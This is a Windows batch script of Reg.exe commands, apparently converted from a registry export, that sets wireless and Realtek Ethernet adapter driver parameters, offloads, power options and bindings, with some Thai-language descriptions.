Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\NetworkAddress" /v "ParamDesc" /t REG_SZ /d "Network Address" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\NetworkAddress" /v "default" /t REG_SZ /d "" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\NetworkAddress" /v "LimitText" /t REG_SZ /d "12" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\NetworkAddress" /v "UpperCase" /t REG_SZ /d "1" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\NetworkAddress" /v "optional" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\NetworkAddress" /v "type" /t REG_SZ /d "edit" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy" /v "ParamDesc" /t REG_SZ /d "Roaming aggressiveness" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy" /v "Type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy" /v "Default" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy\enum" /v "5" /t REG_SZ /d "5.Highest" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy\enum" /v "4" /t REG_SZ /d "4.Medium-high" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy\enum" /v "3" /t REG_SZ /d "3.Medium" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy\enum" /v "2" /t REG_SZ /d "2.Medium-low" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\roamPolicy\enum" /v "1" /t REG_SZ /d "1.Lowest" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaPreferredBand" /v "ParamDesc" /t REG_SZ /d "Preferred Band" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaPreferredBand" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaPreferredBand" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaPreferredBand\enum" /v "1" /t REG_SZ /d "1 - No Preference" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaPreferredBand\enum" /v "2" /t REG_SZ /d "2 - Prefer 2.4Ghz Band" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaPreferredBand\enum" /v "3" /t REG_SZ /d "3 - Prefer 5Ghz Band" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode" /v "ParamDesc" /t REG_SZ /d "Wireless Mode" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode" /v "default" /t REG_SZ /d "12" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "1" /t REG_SZ /d "01 - 11 b" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "2" /t REG_SZ /d "02 - 11 g" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "3" /t REG_SZ /d "03 - 11 b/g" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "4" /t REG_SZ /d "04 - 11 g/n" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "5" /t REG_SZ /d "05 - 11 b/g/n" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "6" /t REG_SZ /d "06 - 11 a" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "7" /t REG_SZ /d "07 - 11 a/n" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "8" /t REG_SZ /d "08 - 11 a/b/g/n" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "9" /t REG_SZ /d "09 - 11 a/g/n" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "10" /t REG_SZ /d "10 - 11 a/n/ac" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "11" /t REG_SZ /d "11 - 11 a/g/n/ac" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0009\Ndi\Params\StaWirelessMode\enum" /v "12" /t REG_SZ /d "12 - 11 a/b/g/n/ac" /f
:: -----------------------------------------------------  !!! Unsupported Reg Type Found !!!  -----------------------------------------------------
REM ~ Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "NetworkInterfaceInstallTimestamp" /t REG_QWORD /d "0x4973b3563e03da01" /f
:: ------------------------------------------------------------------------------------------------------------------------------------------------

Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DriverDesc" /t REG_SZ /d "Realtek PCIe FE Family Controller" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "ProviderName" /t REG_SZ /d "Realtek" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DriverDateData" /t REG_BINARY /d "0080ce51d8eed201" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DriverDate" /t REG_SZ /d "6-27-2017" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DriverVersion" /t REG_SZ /d "10.19.627.2017" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "InfPath" /t REG_SZ /d "oem19.inf" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "InfSection" /t REG_SZ /d "RTL8105DisIntModer100M.ndi.NT" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "MatchingDeviceId" /t REG_SZ /d "PCI\VEN_10EC&DEV_8136&SUBSYS_07891028&REV_07" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*SpeedDuplex" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "ForceMode" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*FlowControl" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*PriorityVLANTag" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*InterruptModeration" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*ReceiveBuffers" /t REG_SZ /d "512" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*TransmitBuffers" /t REG_SZ /d "128" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*IPChecksumOffloadIPv4" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*TCPChecksumOffloadIPv4" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*UDPChecksumOffloadIPv4" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "S5WakeOnLan" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "PowerDownPll" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DeviceRemovable" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwParaMask" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwOptimize" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwOption" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwWolCrcVal" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "LogDisconnectEvent" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "EnableEDT" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "RIACP" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "S5NicKeepOverrideMacAddr" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "S5NicKeepOverrideMacAddrV2" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "PPSW" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "GPPSW" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "S0MgcPkt" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwFPSM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "SwIML" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "SwIML100" /t REG_DWORD /d "320" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "ENPWMode" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "Diskless" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DisklessOption" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "TxOptimizeThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "RxOptimizeThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "CFHTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "LDWTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "RMPT" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "CRSPDThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "ComboPerfAdjust" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "CHNLWTime" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "CHNLWCnt" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "L1L0sLT" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "MRRSize" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "TDBSize" /t REG_DWORD /d "4294967295" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "RDBSize" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwOptionV2" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwBpMask" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "MonitorModeEnabled" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "UCEM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DisablePBA" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*TCPChecksumOffloadIPv6" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*UDPChecksumOffloadIPv6" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*RSS" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*LsoV2IPv4" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*LsoV2IPv6" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*WakeOnPattern" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*WakeOnMagicPacket" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*NumRssQueues" /t REG_SZ /d "4" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "WolShutdownLinkSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*PMARPOffload" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*PMNSOffload" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "EEE" /t REG_SZ /d "1" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*IfType" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*MediaType" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "*PhysicalMediaType" /t REG_DWORD /d "14" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "BusType" /t REG_SZ /d "5" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "Characteristics" /t REG_DWORD /d "132" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "IfTypePreStart" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "InstallTimeStamp" /t REG_BINARY /d "e7070a00050014000a000f0017003e03" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "DeviceInstanceID" /t REG_SZ /d "PCI\VEN_10EC&DEV_8136&SUBSYS_07891028&REV_07\01000000364CE00000" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "ComponentId" /t REG_SZ /d "PCI\VEN_10EC&DEV_8136&SUBSYS_07891028&REV_07" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "NetCfgInstanceId" /t REG_SZ /d "{8E7DAA41-C414-482E-A938-1E4368A565D7}" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "NetLuidIndex" /t REG_DWORD /d "32773" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "BiosSetting" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "PBPFA" /t REG_DWORD /d "7173" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "HwPFA" /t REG_DWORD /d "131072" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "ASPM" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "CLKREQ" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010" /v "LTROBFF" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Linkage" /v "RootDevice" /t REG_MULTI_SZ /d "{8E7DAA41-C414-482E-A938-1E4368A565D7}" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Linkage" /v "Export" /t REG_MULTI_SZ /d "\Device\{8E7DAA41-C414-482E-A938-1E4368A565D7}" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Linkage" /v "UpperBind" /t REG_MULTI_SZ /d "lltdio\0MsLldp\0Ndisuio\0RasPppoe\0RDMANDK\0rspndr\0Tcpip\0Tcpip6" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Linkage" /v "FilterList" /t REG_MULTI_SZ /d "{8E7DAA41-C414-482E-A938-1E4368A565D7}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0000\0{8E7DAA41-C414-482E-A938-1E4368A565D7}-{3BFD7820-D65C-4C1B-9FEA-983A019639EA}-0000\0{8E7DAA41-C414-482E-A938-1E4368A565D7}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0001\0{8E7DAA41-C414-482E-A938-1E4368A565D7}-{B5F4D659-7DAA-4565-8E41-BE220ED60542}-0000\0{8E7DAA41-C414-482E-A938-1E4368A565D7}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0002\0{8E7DAA41-C414-482E-A938-1E4368A565D7}-{B70D6460-3635-4D42-B866-B8AB1A24454C}-0000\0{8E7DAA41-C414-482E-A938-1E4368A565D7}-{430BDADD-BAB0-41AB-A369-94B67FA5BE0A}-0003" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi" /v "Service" /t REG_SZ /d "rt640x64" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\Interfaces" /v "UpperRange" /t REG_SZ /d "ndis5" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\Interfaces" /v "LowerRange" /t REG_SZ /d "ethernet" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*FlowControl" /v "ParamDesc" /t REG_SZ /d "โฟลว์คอนโทรล" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*FlowControl" /v "default" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*FlowControl" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*FlowControl\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*FlowControl\enum" /v "3" /t REG_SZ /d "Rx & Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*InterruptModeration" /v "ParamDesc" /t REG_SZ /d "ขัดจังหวะโมเดอเรชัน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*InterruptModeration" /v "default" /t REG_SZ /d "1" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*InterruptModeration" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*InterruptModeration\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*InterruptModeration\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*IPChecksumOffloadIPv4" /v "ParamDesc" /t REG_SZ /d "IPv4 เช็คซัม ออฟโหลด" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*IPChecksumOffloadIPv4" /v "default" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*IPChecksumOffloadIPv4" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*IPChecksumOffloadIPv4\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*IPChecksumOffloadIPv4\enum" /v "1" /t REG_SZ /d "Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*IPChecksumOffloadIPv4\enum" /v "2" /t REG_SZ /d "Rx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*IPChecksumOffloadIPv4\enum" /v "3" /t REG_SZ /d "Rx & Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv4" /v "ParamDesc" /t REG_SZ /d "ส่งออฟโหลดขนาดใหญ่ v2 (IPv4)" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv4" /v "default" /t REG_SZ /d "1" /f
